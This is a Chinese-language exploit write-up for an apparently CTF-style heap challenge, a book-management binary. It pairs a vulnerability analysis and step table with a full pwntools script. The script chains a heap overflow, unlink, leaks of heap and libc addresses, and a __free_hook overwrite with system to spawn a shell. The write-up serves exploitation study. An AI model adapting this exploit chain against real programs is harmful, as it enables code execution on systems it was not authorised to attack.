# 漏洞利用文档

## 执行环境：
基于调试记录和exp脚本分析，程序运行环境如下：
- **架构**：x86_64 Linux二进制程序
- **保护机制**：从exp利用方式推断，程序可能启用了NX（堆栈不可执行）、ASLR（地址空间随机化）等常见保护，但未启用完整的堆保护（如未检测到unlink攻击）
- **依赖库**：动态链接到libc，使用标准C库函数（如malloc、free、read等）
- **运行需求**：需要标准Linux环境，程序通过命令行交互，接受用户输入管理图书库

## 漏洞成因：
程序是一个图书管理系统，关键结构体为图书条目，在内存中布局如下：
```c
struct book {
    int id;                    // 图书ID
    char *name;               // 书名指针
    char *description;        // 描述指针
    int description_size;     // 描述大小
};
```

**漏洞分析**：
主要漏洞存在于`edit_book`函数中的堆溢出：
```c
readline(*(_BYTE **)(*((_QWORD *)book_pointers + i) + 16LL), 
         *(_DWORD *)(*((_QWORD *)book_pointers + i) + 24LL) - 1)
```
- 当编辑图书描述时，允许写入`描述大小-1`字节
- 如果通过精心构造的图书创建操作，使相邻chunk的元数据可被覆盖，则可能造成堆溢出
- 溢出可伪造chunk的`prev_size`和`size`字段，清除PREV_INUSE位，为unlink攻击创造条件

**漏洞类型**：堆溢出 → unlink攻击 → 任意读写

## 漏洞利用过程：
exp利用步骤及对应的堆内存变化如下：

| 步骤 | EXP操作 | 堆内存关键变化 | 利用目的 |
|------|---------|----------------|----------|
| 1 | 设置作者名+创建临时图书 | 作者名缓冲区填充'x'*27+'leak:'模式；分配初始chunk | 准备堆地址泄露 |
| 2 | 打印图书详情泄露堆地址 | 读取作者名缓冲区中的堆地址，计算堆基址(heap_base) | 获取堆布局信息 |
| 3 | 创建两个缓冲图书(ID=2,3) | 分配多个0x30大小chunk，建立连续堆布局 | 为fastbin攻击准备 |
| 4 | 删除缓冲图书(ID=2,3) | chunk释放到fastbins[0x30]，形成空闲chunk链表 | 创建可重新分配的内存块 |
| 5 | 创建大尺寸描述图书(ID=4,5) | ID=4描述大小0x108，ID=5描述大小0xf0，相邻布局 | 为堆溢出准备目标chunk |
| 6 | 创建包含"/bin/sh"的图书(ID=6) | 分配0x200大小描述chunk，书名为"/bin/sh" | 为system调用准备参数 |
| 7 | 编辑ID=4写入溢出payload | 覆盖ID=5描述chunk元数据：prev_size=0x100, size=0x100, 伪造fd/bk指针 | 设置unlink攻击条件 |
| 8 | 删除ID=5触发unlink | unlink操作修改内存指针，获得任意写能力 | 实现任意地址写原语 |
| 9 | 编辑ID=4设置读写指针 | 修改ID=4描述指针指向可控地址 | 建立任意读写接口 |
| 10 | 读取libc地址 | 通过任意读泄露libc中的__malloc_hook附近地址 | 计算libc基址 |
| 11 | 覆盖__free_hook | 将__free_hook写入system函数地址 | 劫持free函数 |
| 12 | 删除ID=6触发shell | free("/bin/sh")实际执行system("/bin/sh") | 获得代码执行 |

**内存布局演进**：
- 初始：零散chunk分配
- 阶段1：通过创建/删除形成fastbins链表
- 阶段2：大chunk相邻分配，创造溢出条件  
- 阶段3：溢出伪造元数据，unlink修改关键指针
- 阶段4：建立任意读写，最终实现代码执行

## Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample27')
elf = ELF('./data/sample27')
libc = elf.libc

def cmd(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice))

def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(b': ')
    p.sendline(str(book_size))
    p.recvuntil(b': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(b': ')
    p.sendline(str(desc_size))
    p.recvuntil(b': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)

def remove(idx):
    cmd(2)
    p.recvuntil(b': ')
    p.sendline(str(idx))

def edit(idx, desc):
    cmd(3)
    p.recvuntil(b': ')
    p.sendline(str(idx))
    p.recvuntil(b': ')
    p.send(desc)

def author_name(author):
    cmd(5)
    p.recvuntil(b': ')
    p.send(author)

def write_to(addr, content, size):
    # 任意写函数：通过修改ID=4的描述指针实现写入指定地址
    edit(4, p64(addr) + p64(size + 0x100) + b'\n')  # 设置目标地址和大小
    edit(6, content + b'\n')  # 实际写入内容

def read_at(addr):
    # 任意读函数：通过修改ID=4的描述指针实现读取指定地址
    edit(4, p64(addr) + b'\n')  # 设置目标地址
    cmd(4)  # 触发打印，泄露内容
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    content = p.recvline()[:-1]
    p.info(content)
    return content

# ==== 漏洞利用开始 ====

# 步骤1: 堆地址泄露准备
p.recvuntil(b'name: ')
p.sendline(b'x' * (0x20 - 5) + b'leak:')  # 作者名缓冲区填充特定模式
create(0x20, b'tmp a', 0x20, b'b')  # 创建初始图书

# 步骤2: 泄露堆地址并计算基址
cmd(4)
p.recvuntil(b'Author: ')
p.recvuntil(b'leak:')
heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
heap_base = heap_leak - 0x1080  # 根据偏移计算堆基地址

# 步骤3-4: 堆布局准备 - 创建并删除chunk形成fastbins
create(0x20, b'buf 1', 0x20, b'desc buf')
create(0x20, b'buf 2', 0x20, b'desc buf 2')
remove(2)
remove(3)

# 步骤5-6: 创建攻击用的大尺寸chunk
create(0x20, b'name', 0x108, b'overflow')  # ID=4 - 溢出源chunk
create(0x20, b'name', 0x100 - 0x10, b'target')  # ID=5 - 攻击目标chunk  
create(0x20, b'/bin/sh\x00', 0x200, b'to arbitrary read write')  # ID=6 - 最终触发chunk

# 步骤7: 堆溢出攻击 - 伪造fake chunk元数据
ptr = heap_base + 0x1180  # 计算目标指针地址
# 构造unlink payload: 伪造prev_size、size、fd、bk指针
payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + b'\x00' * 0xe0 + p64(0x100)
edit(4, payload)  # 溢出写入，覆盖ID=5的chunk元数据

# 步骤8: 触发unlink攻击
remove(5)  # 删除ID=5，触发unlink操作，修改内存指针

# 步骤9: 设置任意读写能力
edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + b'\n')

# 步骤10: 泄露libc地址
libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_leak  # 设置libc基址

# 步骤11: 覆盖__free_hook为system
write_to(libc.sym['__free_hook'], p64(libc.sym['system']), 0x10)

# 步骤12: 触发shell执行
remove(6)  # 删除ID=6，free("/bin/sh")实际执行system("/bin/sh")

p.interactive()  # 进入交互式shell
```

**关键注释说明**：
- `write_to`和`read_at`函数利用unlink获得的任意写能力实现内存操作
- 堆溢出payload精心构造了fake chunk的fd/bk指针，使unlink时执行`*fd = bk`和`*bk = fd`修改关键内存
- 通过计算得到的堆基址和libc基址，精确定位攻击目标
- 最终通过覆盖`__free_hook`并触发free执行，获得shell权限
